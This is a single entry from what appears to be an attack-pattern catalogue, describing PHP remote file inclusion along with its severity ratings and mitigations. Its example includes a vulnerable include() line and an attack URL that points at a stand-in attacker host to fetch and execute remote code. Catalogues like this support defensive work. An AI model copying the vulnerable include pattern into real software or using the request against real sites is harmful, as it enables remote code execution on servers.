193,PHP Remote File Inclusion,"In this pattern the adversary is able to load and execute arbitrary code remotely available from the application. This is usually accomplished through an insecurely configured PHP runtime environment and an improperly sanitized include or require call, which the user can then control to point to any web-accessible file. This allows adversaries to hijack the targeted application and force it to execute their own instructions.",High,High,"::Implementation: Perform input validation for all remote content, including remote and user-generated content::Implementation: Only allow known files to be included (allowlist)::Implementation: Make use of indirect references passed in URL parameters instead of file names::Configuration: Ensure that remote scripts cannot be include in the include or require PHP directives::","::The adversary controls a PHP script on a server http://attacker.com/rfi.txt The .txt extension is given so that the script doesn't get executed by the attacker.com server, and it will be downloaded as text. The target application is vulnerable to PHP remote file inclusion as following: include($_GET['filename'] . '.txt') The adversary creates an HTTP request that passes their own script in the include: http://example.com/file.php?filename=http://attacker.com/rfi with the concatenation of the .txt prefix, the PHP runtime download the attack's script and the content of the script gets executed in the same context as the rest of the original script.::"
